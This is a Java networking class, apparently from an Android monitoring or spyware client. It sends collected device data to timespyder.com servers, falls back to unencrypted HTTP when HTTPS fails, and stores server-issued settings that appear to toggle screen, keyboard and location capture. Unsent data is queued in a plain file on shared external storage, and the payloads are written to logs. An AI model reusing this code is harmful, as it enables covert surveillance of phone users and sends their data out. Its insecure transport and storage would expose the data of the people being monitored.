package com.inet.android.bs;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Log;

/** Класс отправки запросов
 * 
 * @author johny homicide
 *
 */
public class Request {
	private final String LOG_TAG = "request";
	Context context;

	public Request(Context context) {
		this.context = context;
	}

	// Отправка post-запроса (собранные данные) без использования SSL
	private int sendPostRequest(String postRequest) {
		// Создадим HttpClient и PostHandler
		try {
			HttpClient httpclient = new DefaultHttpClient();
			HttpPost httppost = new HttpPost("http://inp2.timespyder.com");

			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);

			Log.d(LOG_TAG, postRequest);
			FileLog.writeLog("request -> " + postRequest);

			nameValuePairs.add(new BasicNameValuePair("content", postRequest));

			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,
					"cp1251"));

			Log.d(LOG_TAG, "1 - " + EntityUtils.toString(httppost.getEntity()));
			FileLog.writeLog("request -> 1 - "
					+ EntityUtils.toString(httppost.getEntity()));

			// Выполним запрос
			HttpResponse response = httpclient.execute(httppost);

			if (response != null) {
				String strData = EntityUtils.toString(response.getEntity());

				Log.d(LOG_TAG, "2 - " + strData);
				FileLog.writeLog("request -> 2 - " + strData);

				if (strData.indexOf("ANSWER") == -1) {
					Log.d(LOG_TAG, "add line due to error in the answer");
					FileLog.writeLog(LOG_TAG
							+ " -> add line due to error in the answer");

					addLine(postRequest);
				}
			} else {
				Log.d(LOG_TAG, " http response equals null");
				FileLog.writeLog(LOG_TAG + " -> http response equals null");
			}
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			Log.d(LOG_TAG, "UnsupportedEncodingException. Return -3.");
			FileLog.writeLog("request -> UnsupportedEncodingException. Return -3.");

			e.printStackTrace();
			return -3;
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			Log.d(LOG_TAG, "ClientProtocolException. Return -2.");
			FileLog.writeLog("request -> ClientProtocolException. Return -2.");

			e.printStackTrace();
			return -2;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			Log.d(LOG_TAG, "IOException. Return -1.");
			FileLog.writeLog("request -> IOException. Return -1.");

			addLine(postRequest);

			e.printStackTrace();
			return -1;
		}

		return 0;
	}

	// Отправка post-запоса (каждые 4 часа) при использовании SSL
	private int sendSSLPostRequest4(String postRequest)
			throws ClientProtocolException, IOException, IllegalStateException {

		Log.d(LOG_TAG, "SSL request4: " + postRequest);
		FileLog.writeLog(LOG_TAG + "-> ssl request4 - " + postRequest);

		DefaultHttpClient client = (DefaultHttpClient) WebClientDevWrapper
				.getNewHttpClient();

		HttpPost post = new HttpPost("https://inp.timespyder.com");

		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
		nameValuePairs.add(new BasicNameValuePair("content", postRequest));
		post.setEntity(new UrlEncodedFormEntity(nameValuePairs, "cp1251"));

		HttpResponse response = client.execute(post);

		if (response != null) {
			String strData = EntityUtils.toString(response.getEntity());

			Log.d(LOG_TAG, "SSL response4: " + strData);
			FileLog.writeLog("request -> ssl response4 - " + strData);

			if (strData.indexOf("ANSWER") == -1) {
				Log.d(LOG_TAG, "add line due to error in the answer");
				FileLog.writeLog(LOG_TAG
						+ " -> add line due to error in the answer");

				addLine(postRequest);
			} else {
				getResponseData(strData);
			}
		} else {
			Log.d(LOG_TAG, "https response equals null");
			FileLog.writeLog(LOG_TAG + " -> https response equals null");
		}

		return 0;
	}

	// Отправка post-запоса (собранные данные) при использовании SSL
	private int sendSSLPostRequest(String postRequest)
			throws ClientProtocolException, IOException, IllegalStateException {

		Log.d(LOG_TAG, "SSL request: " + postRequest);
		FileLog.writeLog(LOG_TAG + " -> ssl request: " + postRequest);

		DefaultHttpClient client = (DefaultHttpClient) WebClientDevWrapper
				.getNewHttpClient();

		HttpPost post = new HttpPost("https://inp.timespyder.com");

		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
		nameValuePairs.add(new BasicNameValuePair("content", postRequest));
		post.setEntity(new UrlEncodedFormEntity(nameValuePairs, "cp1251"));

		HttpResponse response = client.execute(post);

		if (response != null) {
			String strData = EntityUtils.toString(response.getEntity());

			Log.d(LOG_TAG, "SSL response: " + strData);
			FileLog.writeLog("request -> ssl response - " + strData);

			if (strData.indexOf("ANSWER") == -1) {
				Log.d(LOG_TAG, "add line due to error in the answer");
				FileLog.writeLog(LOG_TAG
						+ " -> add line due to error in the answer");

				addLine(postRequest);
			}
		} else {
			Log.d(LOG_TAG, "https response equals null");
			FileLog.writeLog(LOG_TAG + " -> https response equals null");
		}

		return 0;
	}

	// Отправка post-запроса (каждые 4 часа) без использования SSL
	private int sendFirstPostRequest(String postRequest) {
		// Создадим HttpClient и PostHandler
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://inp2.timespyder.com");

		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);

		Log.d(LOG_TAG, "request:" + postRequest);
		FileLog.writeLog(LOG_TAG + " -> " + postRequest);

		nameValuePairs.add(new BasicNameValuePair("content", postRequest));

		try {
			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,
					"cp1251"));

			Log.d(LOG_TAG, "3 - " + EntityUtils.toString(httppost.getEntity()));
			FileLog.writeLog("request -> 3 - "
					+ EntityUtils.toString(httppost.getEntity()));

			// Выполним запрос
			HttpResponse response = httpclient.execute(httppost);

			if (response != null) {
				String strData = EntityUtils.toString(response.getEntity());

				Log.d(LOG_TAG, "4 - " + strData);
				FileLog.writeLog("request -> 4 - " + strData);

				if (strData.indexOf("ANSWER") == -1) {
					Log.d(LOG_TAG, "add line due to error in the answer");
					FileLog.writeLog(LOG_TAG
							+ " -> add line due to error in the answer");

					addLine(postRequest);
				} else {
					getResponseData(strData);
				}
			} else {
				Log.d(LOG_TAG, " http response equals null");
				FileLog.writeLog(LOG_TAG + " -> http response equals null");
			}
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			Log.d(LOG_TAG, "UnsupportedEncodingException. Return -3.");
			FileLog.writeLog("request -> UnsupportedEncodingException. Return -3.");

			addLine(postRequest);
			e.printStackTrace();
			return -3;
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			Log.d(LOG_TAG, "ClientProtocolException. Return -2.");
			FileLog.writeLog("request -> ClientProtocolException. Return -2.");

			addLine(postRequest);
			e.printStackTrace();
			return -2;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			Log.d(LOG_TAG, "IOException. Return -1.");
			FileLog.writeLog("request -> IOException. Return -1.");

			addLine(postRequest);
			e.printStackTrace();
			return -1;
		}

		return 0;
	}

	// Обработка ответа на post-запрос, отправляемый каждые 4 часа
	private void getResponseData(String string) {
		// TODO Auto-generated method stub

		Log.d(LOG_TAG, "getResponseData: " + string);
		FileLog.writeLog("request -> getResponseData: " + string);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(context);
		Editor ed = sp.edit();

		Pattern pattern = Pattern.compile("<ANSWER>(.+?)</ANSWER>");
		Matcher matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "ANSWER: " + matcher.group(1));
			FileLog.writeLog("ANSWER: " + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "ANSWER: null");
			FileLog.writeLog("ANSWER: null");
		}

		pattern = Pattern.compile("<ACTION>(.+?)</ACTION>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "ACTION: " + matcher.group(1));
			FileLog.writeLog("ACTION: " + matcher.group(1));

			ed.putString("ACTION", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "ACTION: null");
			FileLog.writeLog("ACTION: null");

			ed.putString("ACTION", "");
		}

		pattern = Pattern.compile("<ID>(.+?)</ID>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "ID: " + matcher.group(1));
			FileLog.writeLog("ID: " + matcher.group(1));

			ed.putString("ID", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "ID: null");
			FileLog.writeLog("ID: null");

			ed.putString("ID", "tel");
		}

		pattern = Pattern.compile("<NAME>(.+?)</NAME>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "NAME: " + matcher.group(1));
			FileLog.writeLog("NAME: " + matcher.group(1));

			ed.putString("NAME", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "NAME: null");
			FileLog.writeLog("NAME: null");

			ed.putString("NAME", "");
		}

		pattern = Pattern.compile("<SCR>(.+?)</SCR>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "SCR: " + matcher.group(1));
			FileLog.writeLog("SCR: " + matcher.group(1));

			ed.putString("SCR", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "SCR: null");
			FileLog.writeLog("SCR: null");

			ed.putString("SCR", "");
		}

		pattern = Pattern.compile("<KBD>(.+?)</KBD>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "KBD: " + matcher.group(1));
			FileLog.writeLog("KBD: " + matcher.group(1));

			ed.putString("KBD", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "KBD: null");
			FileLog.writeLog("KBD: null");

			ed.putString("KBD", "1");
		}

		pattern = Pattern.compile("<GEO>(.+?)</GEO>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "GEO: " + matcher.group(1));
			FileLog.writeLog("GEO: " + matcher.group(1));

			ed.putString("GEO", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "GEO: null");
			FileLog.writeLog("GEO: null");

			ed.putString("GEO", "5");
		}

		pattern = Pattern.compile("<GEOMET>(.+?)</GEOMET>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "GEOMET: " + matcher.group(1));
			FileLog.writeLog("GEOMET: " + matcher.group(1));

			ed.putString("GEOMET", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "GEOMET: null");
			FileLog.writeLog("GEOMET: null");

			ed.putString("GEOMET", "");
		}

		pattern = Pattern.compile("<UTCT>(.+?)</UTCT>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "UTCT: " + matcher.group(1));
			FileLog.writeLog("UTCT: " + matcher.group(1));

			ed.putString("UTCT", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "UTCT: null");
			FileLog.writeLog("UTCT: null");

			ed.putString("UTCT", "");
		}

		pattern = Pattern.compile("<TIME_FR>(.+?)</TIME_FR>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "TIME_FR: " + matcher.group(1));
			FileLog.writeLog("TIME_FR: " + matcher.group(1));

			ed.putString("TIME_FR", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "TIME_FR: null");
			FileLog.writeLog("TIME_FR: null");

			ed.putString("TIME_FR", "");
		}

		pattern = Pattern.compile("<TIME_TO>(.+?)</TIME_TO>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "TIME_TO: " + matcher.group(1));
			FileLog.writeLog("TIME_TO: " + matcher.group(1));

			ed.putString("TIME_TO", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "TIME_TO: null");
			FileLog.writeLog("TIME_TO: null");

			ed.putString("TIME_TO", "");
		}

		pattern = Pattern.compile("<BRK1_FR>(.+?)</BRK1_FR>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "BRK1_FR: " + matcher.group(1));
			FileLog.writeLog("BRK1_FR: " + matcher.group(1));

			ed.putString("BRK1_FR", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "BRK1_FR: null");
			FileLog.writeLog("BRK1_FR: null");

			ed.putString("BRK1_FR", "");
		}

		pattern = Pattern.compile("<BRK1_TO>(.+?)</BRK1_TO>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "BRK1_TO: " + matcher.group(1));
			FileLog.writeLog("BRK1_TO: " + matcher.group(1));

			ed.putString("BRK1_TO", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "BRK1_TO: null");
			FileLog.writeLog("BRK1_TO: null");

			ed.putString("BRK1_TO", "");
		}

		pattern = Pattern.compile("<GMT>(.+?)</GMT>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "GMT: " + matcher.group(1));
			FileLog.writeLog("GMT: " + matcher.group(1));

			ed.putString("GMT", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "GMT: null");
			FileLog.writeLog("GMT: null");

			ed.putString("GMT", "");
		}

		ed.commit();
	}

	// Добавление строки в файл для отправки при следующем появление
	// интернет-соединения
	public void addLine(String string) {
		File outFile = new File(Environment.getExternalStorageDirectory(),
				"/conf");
		FileWriter wrt = null;

		Log.d(LOG_TAG, "addLine: " + string);
		FileLog.writeLog("request -> addLine - " + string);

		try {
			wrt = new FileWriter(outFile, true);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			wrt.append(string + "\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			wrt.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		Log.d(LOG_TAG, "addLine: added");
		FileLog.writeLog("request -> addLine - added");
	}

	// Вызов отдельного потока для отправки post-запроса
	public void sendRequest(String str) {
		RequestTask mt = new RequestTask();
		mt.execute(str);
	}

	// Вызов отдельного потока для отправки post-запроса (каждые 4 часа)
	public void sendFirstRequest(String str) {
		FirstRequestTask frt = new FirstRequestTask();
		frt.execute(str);
	}

	class FirstRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();

		}

		@Override
		protected Void doInBackground(String... strs) {
			// sendFirstPostRequest(strs[0]);
			try {
				sendSSLPostRequest4(strs[0]);
			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				Log.d(LOG_TAG, "4 SSl ClientProtocolException");
				FileLog.writeLog(LOG_TAG + " -> 4 SSl ClientProtocolException");
				sendFirstPostRequest(strs[0]);
				e.printStackTrace();
			} catch (IllegalStateException e) {
				// TODO Auto-generated catch block
				Log.d(LOG_TAG, "4 SSl IllegalStateException");
				FileLog.writeLog(LOG_TAG + " -> 4 SSl IllegalStateException");
				sendFirstPostRequest(strs[0]);
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				Log.d(LOG_TAG, "4 SSL IOException");
				FileLog.writeLog(LOG_TAG + " -> 4 SSl IOException");
				sendFirstPostRequest(strs[0]);
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();

		}

		@Override
		protected Void doInBackground(String... strs) {
			// sendPostRequest(strs[0]);
			try {
				sendSSLPostRequest(strs[0]);
			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				Log.d(LOG_TAG, "SSl ClientProtocolException");
				FileLog.writeLog(LOG_TAG + " -> SSl ClientProtocolException");
				sendPostRequest(strs[0]);
				e.printStackTrace();
			} catch (IllegalStateException e) {
				// TODO Auto-generated catch block
				Log.d(LOG_TAG, "SSl IllegalStateException");
				FileLog.writeLog(LOG_TAG + " -> SSl IllegalStateException");
				sendPostRequest(strs[0]);
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				Log.d(LOG_TAG, "SSL IOException");
				FileLog.writeLog(LOG_TAG + " -> SSl IOException");
				sendPostRequest(strs[0]);
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}
}
